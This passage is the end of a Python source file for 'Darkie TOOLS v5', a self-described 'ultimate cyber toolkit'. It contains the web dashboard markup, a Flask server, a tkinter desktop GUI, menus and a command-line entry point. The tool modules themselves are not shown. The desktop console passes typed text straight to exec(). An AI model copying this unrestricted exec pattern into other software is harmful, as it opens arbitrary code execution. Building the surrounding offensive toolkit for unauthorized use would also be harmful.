.status i{width:8px;height:8px;border-radius:50%;background:var(--acc);box-shadow:0 0 9px var(--accdim)}
.status.busy i{background:var(--amber);box-shadow:0 0 9px #a86e1f;animation:pulse 1s ease-in-out infinite}
@keyframes pulse{50%{opacity:.3}}
#runlbl{max-width:280px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:12px;color:var(--muted)}
/* ---------------- shell ---------------- */
main{flex:1;display:flex;min-height:0}
aside{flex:none;width:304px;border-right:1px solid var(--line);display:flex;flex-direction:column;background:linear-gradient(180deg,rgba(255,255,255,.014),transparent)}
.search-wrap{padding:16px 14px 10px}
.search-wrap label{display:flex;align-items:center;gap:9px;height:36px;padding:0 12px;background:var(--panel2);border:1px solid var(--line);border-radius:8px;transition:border-color .15s}
.search-wrap label:focus-within{border-color:var(--accdim)}
.search-wrap svg{flex:none;width:14px;height:14px;color:var(--faint)}
.search-wrap input{flex:1;border:0;background:transparent;color:var(--text);font:12px var(--mono);outline:0}
.search-wrap input::placeholder{color:var(--faint)}
#tree{flex:1;overflow-y:auto;padding:2px 10px 16px}
.gtitle{font-size:10px;letter-spacing:.15em;text-transform:uppercase;color:var(--faint);font-weight:700;padding:15px 10px 6px}
.tool{display:flex;align-items:center;gap:10px;width:100%;text-align:left;background:transparent;border:0;color:var(--muted);
  padding:6px 10px;border-radius:7px;font-size:12.5px;cursor:pointer;transition:background .12s,color .12s}
.tool .idx{font:10px var(--mono);color:var(--faint);width:18px;flex:none}
.tool:hover{background:rgba(47,230,163,.08);color:var(--text)}
.tool:hover .idx{color:var(--acc)}
.tool:active{background:rgba(47,230,163,.14)}
/* ---------------- terminal ---------------- */
section{flex:1;display:flex;flex-direction:column;min-width:0;padding:18px 22px 20px}
.termhead{flex:none;display:flex;align-items:center;gap:11px;margin-bottom:10px}
.dots{display:flex;gap:6px}
.dots span{width:10px;height:10px;border-radius:50%}
.dots .r{background:#ff5f63}.dots .y{background:#f5b93c}.dots .g{background:#3ecf6e}
.termname{font:11px var(--mono);color:var(--faint);letter-spacing:.05em}
.termhead .spacer{flex:1}
.termhead button{background:transparent;border:1px solid var(--line);color:var(--muted);padding:5px 13px;border-radius:7px;cursor:pointer;font:11px var(--mono);transition:.12s}
.termhead button:hover{color:#fff;border-color:var(--red);background:rgba(255,92,105,.09)}
#term{flex:1;overflow-y:auto;background:#05070c;border:1px solid var(--line);border-bottom:0;border-radius:10px 10px 0 0;
  padding:15px 17px;font:12.5px/1.65 var(--mono);white-space:pre-wrap;word-break:break-word;color:#cbd4e7}
#term .out{color:#d5deef}#term .in{color:var(--acc);font-weight:600}#term .err{color:var(--red)}
#term .warn{color:var(--amber)}#term .tag{color:var(--faint);font-style:italic}
#term:empty::before{content:"Select a tool from the left panel. Output streams here.";color:var(--faint);font-style:italic}
/* ---------------- prompt ---------------- */
.promptbar{flex:none;display:none;align-items:center;gap:12px;background:#05070c;border:1px solid var(--line);border-radius:0 0 12px 12px;padding:13px 17px}
.promptbar.show{display:flex;animation:rise .16s ease}
@keyframes rise{from{opacity:0;transform:translateY(5px)}}
.peek{flex:none;font:10px var(--mono);color:var(--acc);border:1px solid rgba(47,230,163,.4);padding:2px 8px;border-radius:5px;letter-spacing:.1em;text-transform:uppercase}
.promptbar .q{flex:none;max-width:46%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font:13px var(--mono);color:var(--text)}
.promptbar input{flex:1;background:transparent;border:0;color:var(--acc);padding:8px 2px;font:13px var(--mono);outline:0}
.promptbar button{flex:none;background:transparent;border:1px solid var(--accdim);color:var(--acc);padding:6px 18px;border-radius:7px;cursor:pointer;font:600 12px var(--mono);transition:.12s}
.promptbar button:hover{background:var(--acc);color:#04231a;border-color:var(--acc)}
/* ---------------- scroll + footer ---------------- */
::-webkit-scrollbar{width:10px;height:10px}
::-webkit-scrollbar-thumb{background:#1b2330;border-radius:6px;border:2px solid var(--bg)}
::-webkit-scrollbar-thumb:hover{background:#273348}
::-webkit-scrollbar-track{background:transparent}
footer{flex:none;text-align:center;padding:9px;font-size:11px;color:var(--faint);border-top:1px solid var(--line);letter-spacing:.02em}
</style>
</head>
<body>
<header>
  <div class="brand"><div class="mark">◈</div><div class="name">Darkie&nbsp;TOOLS</div><div class="ver">v5&nbsp;console</div></div>
  <div id="runlbl"></div>
  <div class="status" id="status"><i></i><span id="stext">idle</span></div>
</header>
<main>
<aside>
  <div class="search-wrap">
    <label><svg viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="4.5" stroke="currentColor"/><path d="M10.5 10.5L14 14" stroke="currentColor"/></svg><input id="q" placeholder="filter tools…" oninput="render()" spellcheck="false"></label>
  </div>
  <div id="tree"></div>
</aside>
<section>
  <div class="termhead">
    <div class="dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
    <div class="termname">output — stream</div>
    <div class="spacer"></div>
    <button onclick="clearOut()">clear</button>
  </div>
  <div id="term"></div>
  <div class="promptbar" id="promptbar">
    <div class="peek">input</div>
    <div class="q" id="pquestion"></div>
    <input id="pinput" onkeydown="if(event.key==='Enter')sendAnswer()" autocomplete="off" spellcheck="false">
    <button onclick="sendAnswer()">send ↵</button>
  </div>
</section>
</main>
<footer>Darkie TOOLS — educational use only · test only systems you own or have permission to test</footer>
<script>
let tools=[],pos=0;
function setStatus(running){const s=document.getElementById('status'),t=document.getElementById('stext');t.textContent=running?'busy':'idle';s.classList.toggle('busy',running);}
async function loadTools(){const r=await fetch('/_data/tools');const d=await r.json();tools=d.tools;setStatus(d.running);render();}
function render(){
  const q=document.getElementById('q').value.toLowerCase();
  const tree=document.getElementById('tree');tree.innerHTML='';
  tools.forEach(g=>{
    const items=g.items.filter(t=>t[0].toLowerCase().includes(q));
    if(!items.length)return;
    const d=document.createElement('div');
    const t=document.createElement('div');t.className='gtitle';t.textContent=g.name;d.appendChild(t);
    items.forEach(i=>{const b=document.createElement('button');b.className='tool';
      const x=document.createElement('span');x.className='idx';x.textContent=String(Array.from(g.items).indexOf(i)+1).padStart(2,'0');
      b.appendChild(x);b.appendChild(document.createTextNode(i[0]));
      b.onclick=()=>runTool(i[1],i[0]);d.appendChild(b);});
    tree.appendChild(d);
  });
}
async function runTool(key,label){document.getElementById('runlbl').textContent='› '+label;setStatus(true);await fetch('/_data/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:key,label})});}
const term=document.getElementById('term');
function addLine(tag,text){const el=document.createElement('div');el.className=tag;el.textContent=text||' ';term.appendChild(el);while(term.childNodes.length>6000)term.removeChild(term.firstChild);term.scrollTop=term.scrollHeight;}
async function poll(){
  const r=await fetch('/_data/poll?pos='+pos);const d=await r.json();
  (d.lines||[]).forEach((t,i)=>addLine((d.tags||[])[i]||'out',t));
  pos=d.pos;setStatus(d.running);
  if(d.prompt){showPrompt(d.prompt);}else hidePrompt();
  setTimeout(poll,240);
}
function showPrompt(text){const pb=document.getElementById('promptbar');if(!pb.classList.contains('show')){pb.classList.add('show');document.getElementById('pquestion').textContent=(text||'').trim();}const inp=document.getElementById('pinput');inp.focus();}
function hidePrompt(){document.getElementById('promptbar').classList.remove('show');}
async function sendAnswer(){const inp=document.getElementById('pinput');await fetch('/_data/answer',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({value:inp.value})});inp.value='';hidePrompt();}
async function clearOut(){await fetch('/_data/clear',{method:'POST'});term.innerHTML='';pos=0;}
loadTools();poll();
</script>
</body></html>"""


def start_web_gui(host="127.0.0.1", port=5000):
    """Run the web console (interactive tools + live output) in a browser."""
    try:
        from flask import Flask, jsonify, request
    except ImportError:
        print(f"  {RED}{SYM_X} Flask required. Install: pip install flask{RESET}")
        return
    sess = InteractiveSession()
    app = Flask(__name__)

    @app.route("/")
    def _index():
        return _WEB_HTML

    @app.route("/_data/tools")
    def _tools():
        return jsonify({
            "tools": [{"name": n, "items": items} for n, items in DASHBOARD_TOOLS],
            "running": sess.running,
        })

    @app.route("/_data/run", methods=["POST"])
    def _run():
        data = request.get_json(force=True, silent=True) or {}
        name = data.get("tool", "")
        label = data.get("label", name)
        ok = sess.start(name, label)
        return jsonify({"ok": bool(ok), "running": sess.running})

    @app.route("/_data/poll")
    def _poll():
        p = request.args.get("pos", type=int, default=0)
        lines, total = sess.snapshot(p)
        return jsonify({
            "lines": [t for _, t in lines],
            "tags": [tag for tag, _ in lines],
            "pos": total,
            "running": sess.running,
            "prompt": sess.wants_input(),
        })

    @app.route("/_data/answer", methods=["POST"])
    def _answer():
        data = request.get_json(force=True, silent=True) or {}
        sess.answer(str(data.get("value", "")))
        return jsonify({"ok": True})

    @app.route("/_data/clear", methods=["POST"])
    def _clear():
        sess.stop()
        sess._lines = []
        sess._acc = ""
        return jsonify({"ok": True})

    try:
        import webbrowser
        webbrowser.open(f"http://{host}:{port}")
    except Exception:
        pass
    print(f"\n  {c('Web Console started', GREEN)}")
    print(f"  {c('Open in your browser:', CYAN)} http://{host}:{port}")
    print(f"  {c('Press Ctrl+C to return.', YELLOW)}\n")
    try:
        app.run(host=host, port=port, debug=False, use_reloader=False)
    except KeyboardInterrupt:
        print(f"\n  {c('Web Console stopped.', YELLOW)}")


def start_desktop_gui():
    """Run the desktop app (tkinter) with the full tool catalog."""

    _BG = "#0b0e14"
    _PANEL = "#10141c"
    _PANEL2 = "#151b27"
    _LINE = "#1d2534"
    _TEXT = "#e2e9f6"
    _MUTED = "#8b95a9"
    _FAINT = "#5b6478"
    _ACC = "#2fe6a3"
    _AMBER = "#ffb454"
    _RED = "#ff5c69"

    try:
        import tkinter as tk
        from tkinter import ttk, scrolledtext, simpledialog
    except Exception:
        print(f"  {RED}{SYM_X} tkinter unavailable.{RESET}")
        print(f"  {YELLOW}Linux: sudo apt install python3-tk{RESET}")
        return

    try:
        _sans = ("Segoe UI", 10); _sans_b = ("Segoe UI", 10, "bold"); _sans_big = ("Segoe UI", 15, "bold")
        _mono = ("Consolas", 10); _mono_b = ("Consolas", 10, "bold")
    except Exception:
        _sans = (); _sans_b = (); _sans_big = (); _mono = (); _mono_b = ()

    style = ttk.Style()
    style.theme_use("clam")
    style.configure(".", background=_BG, foreground=_TEXT, bordercolor=_LINE,
                    lightcolor=_PANEL, darkcolor=_PANEL, troughcolor=_PANEL2)
    style.configure("TFrame", background=_BG)
    style.configure("TLabel", background=_BG, foreground=_TEXT, font=_sans)
    style.configure("TNotebook", background=_BG, borderwidth=0)
    style.configure("TNotebook.Tab", background=_BG, foreground=_FAINT, padding=(18, 9), font=_sans_b)
    style.map("TNotebook.Tab", background=[("selected", "#0f131b")], foreground=[("selected", _ACC)])
    style.configure("TButton", background=_PANEL2, foreground=_TEXT, font=_sans_b, borderwidth=0,
                    padding=(14, 7), focusthickness=0)
    style.map("TButton", background=[("active", "#202a3d")])
    style.configure("Run.TButton", background=_ACC, foreground="#04231a", font=_sans_b, padding=(16, 7))
    style.map("Run.TButton", background=[("active", "#45efb2")])

    class PromptBar:
        def __init__(self, parent, app, after_widget):
            self.app = app
            self.bar = tk.Frame(parent, bg=_PANEL2, highlightbackground=_LINE, highlightthickness=1)
            self.tag = tk.Label(self.bar, text="INPUT", bg=_PANEL2, fg=_ACC, font=_mono)
            self.tag.pack(side=tk.LEFT, padx=12)
            self.q = tk.Label(self.bar, text="", bg=_PANEL2, fg=_TEXT, font=_mono, anchor="w")
            self.q.pack(side=tk.LEFT, padx=(8, 0))
            self.entry = tk.Entry(self.bar, bg=_PANEL2, fg=_ACC, insertbackground=_ACC, font=_mono,
                                  relief=tk.FLAT, highlightthickness=0)
            self.entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=12)
            self.btn = tk.Button(self.bar, text="send ↵", bg=_PANEL2, fg=_ACC, activebackground=_ACC,
                                 activeforeground="#04231a", relief=tk.FLAT, font=_mono, cursor="hand2",
                                 bd=0, highlightthickness=0, command=self._send)
            self.btn.pack(side=tk.RIGHT, padx=12)
            self.entry.bind("<Return>", lambda _: self._send())
            self._after = after_widget

        def _send(self):
            self.app.sess.answer(self.entry.get())
            self.entry.delete(0, tk.END)
            self.bar.pack_forget()

        def show(self, prompt):
            self.q.config(text=(prompt or "Input").strip())
            self.bar.pack(side=tk.BOTTOM, fill=tk.X, after=self._after)

    class Term:
        def __init__(self, parent, app):
            self.app = app
            head = tk.Frame(parent, bg=_PANEL)
            head.pack(side=tk.TOP, fill=tk.X)
            tk.Label(head, text="OUTPUT", bg=_PANEL, fg=_FAINT, font=_mono, padx=12).pack(side=tk.LEFT, pady=7)
            tk.Label(head, text="streaming live", bg=_PANEL, fg=_FAINT, font=_mono).pack(side=tk.LEFT, padx=(4, 0))
            body = tk.Frame(parent, bg=_PANEL, highlightbackground=_LINE, highlightthickness=1)
            body.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
            self.txt = scrolledtext.ScrolledText(body, wrap=tk.WORD, bg="#04060b", fg="#cdd6e8",
                                                 insertbackground=_TEXT, font=_mono, relief=tk.FLAT, bd=0,
                                                 highlightthickness=0, padx=10, pady=6)
            self.txt.pack(fill=tk.BOTH, expand=True)
            self.txt.tag_config("out", foreground="#d5deef")
            self.txt.tag_config("in", foreground=_ACC, font=_mono_b)
            self.txt.tag_config("err", foreground=_RED)
            self.txt.tag_config("warn", foreground=_AMBER)
            self.txt.tag_config("tag", foreground=_FAINT, font=_mono)
            self.promptbar = PromptBar(body, app, after_widget=self.txt)

        def write(self, tag, text):
            self.txt.config(state=tk.NORMAL)
            self.txt.insert(tk.END, text + "\n", tag)
            self.txt.see(tk.END)
            self.txt.config(state=tk.DISABLED)

    class App:
        def __init__(self, root):
            self.root = root
            self.sess = InteractiveSession()
            self.pos = 0
            self.prompt_open = False
            self.keys = []
            self.root.title("Darkie TOOLS v5 — security console")
            self.root.configure(bg=_BG)
            self.root.geometry("1180x780")
            self.root.minsize(880, 600)
            self._build_header(root)
            self._build_root(root)
            self._poll()

        def _build_header(self, root):
            hd = tk.Frame(root, bg=_PANEL, height=58, bd=0, highlightthickness=0)
            hd.pack(side=tk.TOP, fill=tk.X, padx=1, pady=1)
            hd.pack_propagate(False)
            tk.Label(hd, text="◈  Darkie TOOLS", bg=_PANEL, fg=_ACC, font=_sans_big).pack(side=tk.LEFT, padx=(14, 6))
            tk.Label(hd, text="v5  ·  security console", bg=_PANEL, fg=_FAINT, font=_mono).pack(side=tk.LEFT, padx=(6, 0))
            self.dot = tk.Label(hd, text="●", bg=_PANEL, fg=_ACC, font=_mono)
            self.dot.pack(side=tk.RIGHT, padx=(0, 14))
            self.headlbl = tk.Label(hd, text="Ready", bg=_PANEL, fg=_MUTED, font=_mono)
            self.headlbl.pack(side=tk.RIGHT, before=self.dot, padx=(0, 8))

        def _build_root(self, root):
            nb = ttk.Notebook(root)
            nb.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=8, pady=6)
            self.tools_tab = ttk.Frame(nb)
            nb.add(self.tools_tab, text="   Tools   ")
            self.console_tab = ttk.Frame(nb)
            nb.add(self.console_tab, text="   Console   ")
            self._build_tools()
            self._build_console()

        def _build_tools(self):
            wrap = ttk.Frame(self.tools_tab)
            wrap.pack(fill=tk.BOTH, expand=True)
            side = tk.Frame(wrap, bg=_PANEL, bd=0, highlightbackground=_LINE, highlightthickness=1)
            side.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 1))
            tk.Label(side, text="TOOLS", bg=_PANEL, fg=_FAINT, font=_mono, padx=10, pady=8).pack(anchor="w")
            self.svar = tk.StringVar()
            self.svar.trace_add("write", lambda *_: self._refill())
            tk.Entry(side, bg=_PANEL2, fg=_TEXT, insertbackground=_TEXT, relief=tk.FLAT,
                     highlightbackground=_LINE, highlightcolor=_ACC, highlightthickness=1,
                     font=_mono, bd=0, width=30).pack(padx=10, pady=(0, 8), fill=tk.X)
            self.list = tk.Listbox(side, bg=_PANEL, fg=_MUTED, bd=0, font=_mono,
                                   selectbackground=_BG, selectforeground=_ACC,
                                   highlightthickness=0, activestyle="none", cursor="hand2",
                                   exportselection=False)
            self.list.pack(fill=tk.BOTH, expand=True, padx=6)
            self.list.bind("<Double-Button-1>", lambda _: self._run_selected())
            btnrow = tk.Frame(side, bg=_PANEL, bd=0)
            btnrow.pack(fill=tk.X, padx=10, pady=10)
            self.run_btn = ttk.Button(btnrow, text="Run", style="Run.TButton", command=self._run_selected)
            self.run_btn.pack(side=tk.LEFT, expand=True, fill=tk.X)
            ttk.Button(btnrow, text="Stop", command=self._stop).pack(side=tk.LEFT, expand=True, fill=tk.X, padx=(6, 0))
            self.termpanel = tk.Frame(wrap, bg=_BG)
            self.termpanel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
            self.term = Term(self.termpanel, self)
            self._refill()

        def _refill(self):
            q = self.svar.get().lower()
            self.list.delete(0, tk.END)
            self.keys = []
            for name, items in DASHBOARD_TOOLS:
                self.list.insert(tk.END, "   " + name.upper())
                self.list.itemconfig(tk.END, foreground=_FAINT)
                self.keys.append(None)
                for label, key in items:
                    if q and q not in label.lower():
                        continue
                    self.list.insert(tk.END, "    " + label)
                    self.keys.append((label, key))

        def _get_sel(self):
            sel = self.list.curselection()
            if not sel or self.keys[sel[0]] is None:
                return None
            return self.keys[sel[0]]

        def _run_selected(self):
            leaf = self._get_sel()
            if not leaf:
                return
            label, key = leaf
            if self.sess.start(key, label):
                self._set_status(running=True, label="Running: " + label)

        def _stop(self):
            self.sess.stop()
            self._set_status(running=False, label="Stopped")

        def _set_status(self, running, label):
            self.headlbl.config(text=label)
            self.dot.config(fg=_AMBER if running else _ACC)

        def _build_console(self):
            fr = ttk.Frame(self.console_tab)
            fr.pack(fill=tk.BOTH, expand=True, padx=0, pady=0)
            cwrap = tk.Frame(fr, bg=_PANEL, highlightbackground=_LINE, highlightthickness=1)
            cwrap.pack(fill=tk.BOTH, expand=True)
            self.cterm = Term(cwrap, self)
            row = tk.Frame(fr, bg=_BG, bd=0)
            row.pack(fill=tk.X, pady=(6, 0))
            self.cmd_var = tk.StringVar()
            e = tk.Entry(row, bg=_PANEL2, fg=_TEXT, insertbackground=_TEXT, relief=tk.FLAT,
                         highlightbackground=_LINE, highlightcolor=_ACC, highlightthickness=1, font=_mono, bd=0)
            e.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 6))
            e.bind("<Return>", lambda _: self._console_run())
            ttk.Button(row, text="Run", command=self._console_run).pack(side=tk.RIGHT)

        def _console_run(self):
            cmd = self.cmd_var.get().strip()
            if not cmd:
                return
            self.cmd_var.set("")
            self.cterm.write("out", "> " + cmd)
            import io as _io, sys as _sys

            def run():
                f = _io.StringIO()
                old = _sys.stdout
                _sys.stdout = f
                try:
                    exec(cmd, globals())
                except Exception as ex:
                    print("Error: {0}".format(ex))
                finally:
                    _sys.stdout = old
                self._console_write(f.getvalue())
            threading.Thread(target=run, daemon=True).start()

        def _console_write(self, s):
            def _do():
                self.cterm.write("out", s.rstrip("\n"))
            self.root.after(0, _do)

        def _poll(self):
            lines, self.pos = self.sess.snapshot(self.pos)
            for tag, text in lines:
                self.term.write(tag, text)
            if self.sess.wants_input() and not self.prompt_open:
                self.prompt_open = True
                self.root.after(0, self._ask_prompt)
            if not self.sess.running and self.headlbl.cget("text") not in ("Ready", "Stopped"):
                self.headlbl.config(text="Ready")
                self.dot.config(fg=_ACC)
            self.root.after(120, self._poll)

        def _ask_prompt(self):
            prompt = self.sess.wants_input()
            if prompt is not None:
                self.term.promptbar.show(prompt)
            self.prompt_open = False

    root = tk.Tk()
    App(root)
    root.mainloop()


def menu_gui():
    _menu_loop("gui", "Graphical Interfaces", [
        ("1", "Web Dashboard (opens browser)", lambda: start_web_gui()),
        ("2", "Desktop App (tkinter)", start_desktop_gui),
        ("b", "Back to main menu", None),
    ], GREEN)


# ══════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════

BANNER = [
    r" ____             _    _         _____ ___   ___  _     ____  ",
    r"|  _ \  __ _ _ __| | _(_) ___   |_   _/ _ \ / _ \| |   / ___| ",
    r"| | | |/ _` | '__| |/ / |/ _ \    | || | | | | | | |   \___ \ ",
    r"| |_| | (_| | |  |   <| |  __/    | || |_| | |_| | |___ ___) |",
    r"|____/ \__,_|_|  |_|\_\_|\___|    |_| \___/ \___/|_____|____/ ",
    "                                                              ",
]


def print_banner():
    for line in BANNER:
        if line.strip():
            print(f"  {gradient_line(line)}")
        else:
            print()
        time.sleep(0.04)
    title = f"{APP_NAME} — Ultimate Cyber Toolkit"
    print(f"\n{CYAN}{BOLD}{SYM_BOX_TL}{'='*62}{SYM_BOX_TR}{RESET}")
    time.sleep(0.05)
    for i in range(0, len(title) + 1):
        sys.stdout.write(f"\r{CYAN}{BOLD}{SYM_BOX_V}  {title[:i]:<62}  {SYM_BOX_V}{RESET}")
        sys.stdout.flush()
        time.sleep(0.015)
    print(f"\n{CYAN}{BOLD}{SYM_BOX_BL}{'='*62}{SYM_BOX_BR}{RESET}")
    print(f"  {c(SYM_CLOCK + ' 100+ tools', GREEN)} across {c('17 modules', CYAN)} — {c('terminal + web + desktop', MAGENTA)}\n")
    print(f"  {YELLOW}{SYM_WARN} Educational use only. Test only systems you own or have permission to test.{RESET}\n")


def main():
    print_banner()
    while True:
        header_box(f"{APP_NAME} — Ultimate Cyber Toolkit", CYAN)
        if sys.stdout.isatty():
            print(f"  {dim(live_status_line())}")
            print()
        for m in MODULES:
            print(f"  {c(('['+m['key']+']').ljust(4), m['color'])} {m['name']:<30} {c(m['desc'], MAGENTA)}")
        print()
        print(f"  {c('[?]', YELLOW)}  Help   {c('[q]', RED)}  Quit")
        print()
        try:
            choice = input(f"  {c(f'What would you like to do? {SYM_PROMPT} ', CYAN)}").strip().lower()
            if choice == "?":
                print(f"\n  {c('How to use:', CYAN)}")
                print(f"  {c('1.', GREEN)}  Type a number and press Enter to open that module.")
                print(f"  {c('2.', GREEN)}  Press 'b' to go back, 'q' to quit.")
                print(f"  {c('3.', GREEN)}  Option 17 opens the graphical interfaces, option 18 the Native Toolbox.")
                print(f"  {c('4.', GREEN)}  Flags: --web, --web PORT, --gui, --deps")
                input(f"\n  {c('Press Enter to continue...', CYAN)}")
            elif choice == "q":
                print(f"\n  {c('Goodbye! Stay secure and ethical.', GREEN)}\n")
                break
            else:
                handler = KEY_MAP.get(choice, {}).get("id")
                if handler:
                    fn = globals().get("menu_" + handler)
                    if fn:
                        fn()
                    else:
                        print(f"  {RED}Module not found.{RESET}")
                else:
                    print(f"  {RED}Invalid choice.{RESET}")
        except KeyboardInterrupt:
            print(f"\n  {c('Goodbye! Stay secure and ethical.', GREEN)}\n")
            break
        except Exception as e:
            print(f"\n  {RED}{SYM_X} Module error: {e}{RESET}")
            print(f"  {YELLOW}Returning to main menu.{RESET}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=f"{APP_NAME} — Ultimate Cyber Toolkit (educational, own-account only)",
        epilog="Examples:\n  python3 tool.py            start the interactive menu\n  python3 tool.py --web      open the Web Dashboard\n  python3 tool.py --web 8080  web dashboard on port 8080\n  python3 tool.py --gui     open the Desktop GUI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--web", nargs="?", const=5000, type=int, metavar="PORT", help="start the Web Dashboard (default port 5000)")
    parser.add_argument("--gui", action="store_true", help="start the Desktop GUI (tkinter)")
    parser.add_argument("--host", default="127.0.0.1", help="host to bind the Web Dashboard to")
    parser.add_argument("--version", action="version", version=f"Darkie TOOLS v{VERSION}")
    parser.add_argument("--deps", action="store_true", help="install missing dependencies, then exit")
    parser.add_argument("--run", metavar="TOOL", help="run one tool non-interactively, e.g. --run osint_ipgeo 8.8.8.8")
    parser.add_argument("--list-tools", action="store_true", help="list available --run tool names, then exit")
    parser.add_argument("run_args", nargs="*", help="arguments passed to the tool given by --run")
    args = parser.parse_args()
    if args.deps:
        print(f"  {GREEN}{SYM_CHECK}  Dependencies ready.{RESET}")
        sys.exit(0)
    if args.list_tools:
        import inspect
        skip = {"menu_", "main", "print_banner", "start_web_gui", "start_desktop_gui", "_"}
        names = sorted(n for n, fn in globals().items()
                       if callable(fn) and not n.startswith("_")
                       and not any(n.startswith(s) for s in skip))
        print("\n".join(names))
        sys.exit(0)
    if args.run:
        import builtins
        import io as _run_io
        fn = globals().get(args.run)
        if not callable(fn):
            print(f"  {RED}{SYM_X} Unknown tool: {args.run}{RESET}")
            print("  Run with --list-tools to see available tools.")
            sys.exit(1)
        queued = list(args.run_args)

        def _auto(prompt=""):
            return queued.pop(0) if queued else ""

        _old_in, _old_out = builtins.input, sys.stdout
        _buf = _run_io.StringIO()
        sys.stdout = _buf
        builtins.input = _auto
        try:
            fn()
        except Exception as e:
            _buf.write(f"Error: {e}")
        finally:
            sys.stdout = _old_out
            builtins.input = _old_in
        sys.stdout.write(_buf.getvalue())
        sys.exit(0)
    if args.web is not None:
        start_web_gui(host=args.host, port=args.web)
    elif args.gui:
        start_desktop_gui()
    else:
        try:
            main()
        except KeyboardInterrupt:
            print(f"\n\n  {c('Goodbye! Stay secure and ethical.', GREEN)}\n")
            sys.exit(0)
